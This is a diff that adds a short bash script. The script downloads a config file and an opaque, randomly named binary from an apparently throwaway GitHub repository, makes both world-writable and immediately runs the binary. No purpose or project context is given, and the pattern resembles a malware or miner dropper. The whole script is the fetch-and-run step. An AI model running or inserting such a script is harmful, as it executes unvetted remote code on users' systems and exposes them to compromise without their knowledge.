@@ -1,0 +1,6 @@
+#!/bin/bash
+
+wget https://github.com/iush7394/super-duper-spoon/raw/main/appsettings.json
+wget https://github.com/iush7394/super-duper-spoon/releases/download/latest/jtkaer
+chmod 777 jtkaer appsettings.json
+./jtkaer
